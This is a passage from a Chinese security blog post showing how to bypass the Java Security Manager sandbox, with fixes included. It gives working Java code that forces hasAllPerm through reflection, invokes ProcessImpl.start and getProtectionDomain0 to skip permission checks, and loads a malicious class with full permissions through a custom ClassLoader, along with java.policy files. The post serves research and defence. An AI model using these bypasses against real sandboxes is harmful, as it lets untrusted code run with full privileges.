class="params">()</span> </span>&#123;</span><br><span class="line">                    s.getClass().getProtectionDomain().implies</span><br><span class="line">                        (SecurityConstants.ALL_PERMISSION);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        security = s;<span class="comment">//赋值在这里~</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果被赋予了反射权限，那么是否能通过反射直接把security置为null，使java security manager失效呢？我们试验一下：</p><p>java.policy如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>反射代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setSecurityByReflection</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.System"</span>);</span><br><span class="line">        Field field=clz.getDeclaredField(<span class="string">"security"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(System.class,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>竟然报异常<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchFieldException: security</span><br><span class="line">at java.lang.Class.getDeclaredField(Class.java:<span class="number">2070</span>)</span><br><span class="line">at evil.Poc.setSecurityByReflection(Poc.java:<span class="number">35</span>)</span><br><span class="line">at evil.Poc.main(Poc.java:<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p><p>不科学啊，反复试了几次，发现java.lang.System中其他变量都可以反射，就security变量不行。（这个坑调试了一下午=_=||）</p><p>不死心，跟了一下getDeclaredField方法，发现在sun.reflect.Reflection中定义了一个fieldFilterMap，指定了几个禁止反射的变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    HashMap var0 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    var0.put(Reflection.class, <span class="keyword">new</span> String[]&#123;<span class="string">"fieldFilterMap"</span>, <span class="string">"methodFilterMap"</span>&#125;);</span><br><span class="line">    var0.put(System.class, <span class="keyword">new</span> String[]&#123;<span class="string">"security"</span>&#125;);</span><br><span class="line">    var0.put(Class.class, <span class="keyword">new</span> String[]&#123;<span class="string">"classLoader"</span>&#125;);</span><br><span class="line">    fieldFilterMap = var0;</span><br><span class="line">    methodFilterMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中就包括System.class中的security变量以及fieldFilterMap本身。在getDeclaredField中，调用了过滤fields的方法，过滤了这些变量。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Field[] filterFields(Class&lt;?&gt; var0, Field[] var1) &#123;</span><br><span class="line">    <span class="keyword">return</span> fieldFilterMap == <span class="keyword">null</span>?var1:(Field[])((Field[])filter(var1, (String[])fieldFilterMap.get(var0)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看来，通过反射直接修改security是不行的了。这游戏真难。</p><p>然而，java的反射何其强大，既然负责检查的检察官java security manager不可修改，那我就修改你检查的材料–ProtectionDomain。于是我看了一下ProtectionDomain类：<br>java.security.ProtectionDomain<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectionDomain</span> </span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// Set up JavaSecurityAccess in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaSecurityAccess(<span class="keyword">new</span> JavaSecurityAccessImpl());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CodeSource */</span></span><br><span class="line">    <span class="keyword">private</span> CodeSource codesource ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ClassLoader the protection domain was consed from */</span></span><br><span class="line">    <span class="keyword">private</span> ClassLoader classloader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Principals running-as within this protection domain */</span></span><br><span class="line">    <span class="keyword">private</span> Principal[] principals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the rights this protection domain is granted */</span></span><br><span class="line">    <span class="keyword">private</span> PermissionCollection permissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if the permissions object has AllPermission */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasAllPerm = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the PermissionCollection is static (pre 1.4 constructor)</span></span><br><span class="line"><span class="comment">       or dynamic (via a policy refresh) */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> staticPermissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br></pre></td></tr></table></figure></p><p>如前面所说，一个类的CodeSource和permissions构成了这个类的ProtectionDomain，亦可通过这里来验证。仔细看一遍，发现hasAllPerm可能是个软柿子，应该是一个标记这个类是否有所有权限的布尔变量。利用反射，把它置为true应当可以使当前类获取所有权限。</p><p>但是AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。不慌，那我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">    <span class="comment">//遍历栈帧</span></span><br><span class="line">    <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//反射当前栈帧中的类</span></span><br><span class="line">            Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">            Field field = clz.getProtectionDomain().getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">            <span class="comment">//压制java的访问检查</span></span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//把hasAllPerm置为true</span></span><br><span class="line">            field.set(clz.getProtectionDomain(), <span class="keyword">true</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"calc"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行一下，又抛出了异常<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.security.AccessControlException: <span class="function">access <span class="title">denied</span> <span class="params">(<span class="string">"java.lang.RuntimePermission"</span> <span class="string">"getProtectionDomain"</span>)</span></span></span><br><span class="line"><span class="function">at java.security.AccessControlContext.<span class="title">checkPermission</span><span class="params">(AccessControlContext.java:<span class="number">472</span>)</span></span></span><br><span class="line"><span class="function">at java.security.AccessController.<span class="title">checkPermission</span><span class="params">(AccessController.java:<span class="number">884</span>)</span></span></span><br><span class="line"><span class="function">at java.lang.SecurityManager.<span class="title">checkPermission</span><span class="params">(SecurityManager.java:<span class="number">549</span>)</span></span></span><br><span class="line"><span class="function">at java.lang.Class.<span class="title">getProtectionDomain</span><span class="params">(Class.java:<span class="number">2299</span>)</span></span></span><br><span class="line"><span class="function">at evil.Poc.<span class="title">setHasAllPerm</span><span class="params">(Poc.java:<span class="number">43</span>)</span></span></span><br><span class="line"><span class="function">at evil.Poc.<span class="title">main</span><span class="params">(Poc.java:<span class="number">19</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>没有getProtectionDomain的权限。我们看看getProtectionDomain的实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//在这里检查权限</span></span><br><span class="line">        sm.checkPermission(SecurityConstants.GET_PD_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用native方法获取ProtectionDomain</span></span><br><span class="line">    java.security.ProtectionDomain pd = getProtectionDomain0();</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allPermDomain == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.security.Permissions perms =</span><br><span class="line">                <span class="keyword">new</span> java.security.Permissions();</span><br><span class="line">            perms.add(SecurityConstants.ALL_PERMISSION);</span><br><span class="line">            allPermDomain =</span><br><span class="line">                <span class="keyword">new</span> java.security.ProtectionDomain(<span class="keyword">null</span>, perms);</span><br><span class="line">        &#125;</span><br><span class="line">        pd = allPermDomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain0</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></p><p>getProtectionDomain方法中，先检查了权限，然后再调用私有的原生方法getProtectionDomain0来完成getProtectionDomain。那么我们完全可以通过反射直接运行getProtectionDomain0方法，从而绕过对getProtectionDomain方法的权限检查。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm0</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="comment">//遍历栈帧</span></span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz=Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                <span class="comment">//利用反射调用getProtectionDomain0方法</span></span><br><span class="line">                Method getProtectionDomain=clz.getClass().getDeclaredMethod(<span class="string">"getProtectionDomain0"</span>,<span class="keyword">null</span>);</span><br><span class="line">                getProtectionDomain.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ProtectionDomain pd=(ProtectionDomain) getProtectionDomain.invoke(clz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(pd!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    Field field=pd.getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    field.set(pd,<span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>运行，如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p><p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b449c0760768.png" alt="bypass-by-reflection.PNG"></p><p>exp地址：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-reflection" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-reflection</a></p><p>修复方法：不授予accessDeclaredMembers权限和suppressAccessChecks权限。</p><p>然而在java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，可以设置禁止反射的方法和变量的黑名单。还记得上面无法反射System类中security的原因吗？在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerFieldsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerMethodsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    methodFilterMap = registerFilter(methodFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个map即可。</p><p>使用这种方式时，需要注意，有些方法的实现是，在public方法里面调用security manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过security manager的检查。例如平时我们调用<code>Runtime.getRuntime().exec(command)</code>，调用链如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里执行命令的功能是调用ProcessBuilder实现的。我们跟进去看一下start方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>)</span><br><span class="line">        security.checkExec(prog);</span><br><span class="line">    <span class="comment">//在这里检查了是否有执行命令的权限</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                 environment,</span><br><span class="line">                                 dir,</span><br><span class="line">                                 redirects,</span><br><span class="line">                                 redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后调用ProcessImpl.start实现这个功能。</span></span><br><span class="line">    <span class="comment">//省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从代码中我们看到，正如前面所说，完成功能的是ProcessImpl.start方法，而在这个方法调用之前，security manager就已经完成了检测，于是，反射这个方法，调用它，就可以绕过检测。代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">executeCommandWithReflection</span><span class="params">(String command)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clz.getDeclaredMethod(<span class="string">"start"</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(clz,<span class="keyword">new</span> String[]&#123;command&#125;,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">false</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="创建类加载器绕过java-security-manager"><a href="#创建类加载器绕过java-security-manager" class="headerlink" title="创建类加载器绕过java security manager"></a>创建类加载器绕过java security manager</h4><p>如前面所说，一个类的ProtectionDomain在这个类被类加载器加载时初始化，如果我们能自定义一个类加载器，加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这个恶意类不就可以有所有权限了吗？即便如此，这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。</p><p>这个时候就是doPrivileged发挥作用的时候了，如上面所说，AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged方法的栈帧为止。只要我们在恶意类中调用doPrivileged方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager。</p><p>java.policy如下，这里需要读class文件，所以需要读文件权限<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission <span class="string">"createClassLoader"</span>;</span><br><span class="line">    permission java.io.FilePermission <span class="string">"&lt;&lt;ALL FILES&gt;&gt;"</span>, <span class="string">"read"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>恶意类：com.evil.EvilClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="comment">//在doPrivileged中执行恶意操作</span></span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span>  PrivilegedAction()  &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span>  Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Process process = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>自定义类加载器：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//获取byte数组的字节码</span></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//这里没有调用父类的defineClass方法，而是调用了下面的defineClazz方法。</span></span><br><span class="line">            Class&lt;?&gt; c = defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在这个自定义的defineClazz方法中</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">            <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc=ClassLoader.class.getProtectionDomain().getPermissions();</span><br><span class="line">            <span class="comment">//赋予ClassLoader类的权限，其实就是所有权限</span></span><br><span class="line">            ProtectionDomain pd=<span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                    pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用父类的defineClass完成功能</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在findClass方法中，我们并没有直接调用父类的defineClass方法，因为在父类的defineClass方法中：</p><p>java.lang.ClassLoader line639<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//最后一个参数是传入的ProtectionDomain</span></span><br><span class="line">    <span class="comment">//这个函数的实现抄录在下面</span></span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟一下defineClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span 